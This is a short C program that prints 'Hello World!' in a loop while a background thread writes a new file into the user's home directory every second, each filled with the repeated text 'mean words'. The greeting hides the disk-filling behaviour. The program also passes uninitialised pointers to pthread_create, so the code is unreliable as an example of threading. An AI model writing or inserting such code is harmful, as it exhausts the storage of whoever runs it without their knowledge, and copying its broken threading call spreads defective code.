#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>

void* makeLotsOfFiles(void *arg){
    int counter = 0;
    while(1){
        char name[10000];
        sprintf(name, "%s/%d.haha", getenv("HOME") , counter);
        FILE *f = fopen(name, "w");
        if(!f){
            printf("Error opening file: %d\n", errno);
            return NULL;
        }

        for(int i = 0; i < 10000; i++)
            fprintf(f, "mean words");
        fclose(f);
        sleep(1);
        counter++;
    }
    return NULL;

}

int main(){
    pthread_t *thread;
    pthread_attr_t *attr;
    pthread_create(thread, attr, makeLotsOfFiles, NULL);
    while(1){
        puts("Hello World!");
        sleep(3);
    }
}
